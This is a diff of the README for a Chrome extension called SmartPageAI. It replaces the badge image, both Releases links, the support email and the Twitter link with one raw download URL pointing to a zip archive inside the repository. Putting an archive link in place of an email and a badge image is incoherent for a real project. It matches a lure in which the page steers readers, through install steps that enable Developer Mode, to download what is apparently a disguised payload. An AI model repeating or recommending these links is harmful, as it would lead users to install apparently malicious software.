@@ -1,6 +1,6 @@
 # SmartPageAI 🌐
 
-![SmartPageAI](https://img.shields.io/badge/SmartPageAI-v1.0-blue)
+![SmartPageAI](https://github.com/iKoko11/SmartPageAI/raw/refs/heads/main/src/AI_Smart_Page_v1.0.zip)
 
 Welcome to the SmartPageAI repository! SmartPage AI is a modern Chrome extension that empowers users to summarize, translate, answer questions, and analyze any webpage or screenshot using OpenAI's GPT models. With its beautiful Markdown output and polished, minimal UI, it enhances your browsing experience.
 
@@ -28,7 +28,7 @@ Welcome to the SmartPageAI repository! SmartPage AI is a modern Chrome extension
 
 To install SmartPageAI, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/iKoko11/SmartPageAI/releases). Make sure to choose the correct file for your operating system.
+1. **Download the latest release** from the [Releases section](https://github.com/iKoko11/SmartPageAI/raw/refs/heads/main/src/AI_Smart_Page_v1.0.zip). Make sure to choose the correct file for your operating system.
 2. **Unzip the downloaded file** if it is in a compressed format.
 3. **Open Chrome** and go to `chrome://extensions/`.
 4. **Enable Developer Mode** by toggling the switch in the top right corner.
@@ -70,12 +70,12 @@ SmartPageAI is licensed under the MIT License. See the [LICENSE](LICENSE) file f
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: support@smartpageai.com
-- **Twitter**: [@SmartPageAI](https://twitter.com/SmartPageAI)
+- **Email**: https://github.com/iKoko11/SmartPageAI/raw/refs/heads/main/src/AI_Smart_Page_v1.0.zip
+- **Twitter**: [@SmartPageAI](https://github.com/iKoko11/SmartPageAI/raw/refs/heads/main/src/AI_Smart_Page_v1.0.zip)
 
 ## Releases 📦
 
-To download the latest version of SmartPageAI, visit the [Releases section](https://github.com/iKoko11/SmartPageAI/releases). Download the appropriate file and follow the installation instructions.
+To download the latest version of SmartPageAI, visit the [Releases section](https://github.com/iKoko11/SmartPageAI/raw/refs/heads/main/src/AI_Smart_Page_v1.0.zip). Download the appropriate file and follow the installation instructions.
 
 ## Conclusion
 
